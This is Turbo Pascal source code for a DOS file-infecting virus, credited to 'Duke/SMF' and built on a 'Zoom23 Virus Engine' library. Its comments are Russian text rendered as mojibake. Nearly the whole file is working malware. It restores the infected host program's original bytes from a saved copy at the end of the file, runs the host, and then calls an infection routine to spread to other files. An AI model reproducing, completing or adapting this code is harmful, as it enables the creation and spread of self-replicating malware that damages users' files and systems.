   (*
   Created (c) by Duke/SMF
   Using Zoom23 Virus Engine (c) by Zoom23
   *®á«¥ ª®¬¯¨«ïæ¨¨ ®¡à ¡®â âì ¯à®£à ¬¬®© PKLITE !
   *)
   {$M 2000, 0, 2000}
   {$I-,S-}
   Uses zve,dos;
   {---------------------------------}
   procedure Execute;
   const Change=4444;
   var a:file; {¯®à ¦¥ë© ä ©«}
       par:string;
       i:byte;
       w:array[1..Change] of byte;
       s:string;
       f:integer;
   begin
   s:=paramstr(0);
   assign(a,s);reset(a,1);
   f:=filesize(a);
   if f<=Change then Exit;            {…á«¨ ¬ë ¢ ç¨áâ®¬ ¢¨àãá¥ -   ¢ëå®¤}
   {‚®§¢à é ¥¬ ¦¥àâ¢¥ "€" ¯¥à¢® ç «ìë© ¢¨¤:}
   seek(a,f-Change-5);                {“ª § â¥«ì ¯®áâ ¢«¥    ç «® save-"€".}
   BlockRead(a,w,Change);             {Save-"A" áç¨â  ¢ ¬ áá¨¢ W.}
   seek(a,0);                         {“ª § â¥«ì ¯®áâ ¢«¥    ç «® "€".}
   BlockWrite(a,w,Change);            {Œ áá¨¢ W § ¯¨á  ¢  ç «® "€".}
   seek(a,f-Change-5);                {“ª § â¥«ì ¯®áâ ¢«¥    ç «® save-"€".}
   truncate(a);                       {Žâ¡à áë¢ ¥âáï save-ç áâì "€".}
   close(a);                          {‡ ªàë¢ ¥¬ "€"}
   par:='This virus created by Duke/SMF';
   par:='Using "Zoom23 Virus Engine" [ZVE] by Zoom23';
   par:='';
   for i:=1 to paramcount do          {‘®åà ï¥¬ ¯ à ¬¥âàë}
     par:=par+paramstr(i)+' ';
   exec(s,par);                       {‡ ¯ãáª ¥¬ "€"}
   end;
   {---------------------------------}
   BEGIN
     Execute;
     InfectNow;
   END.
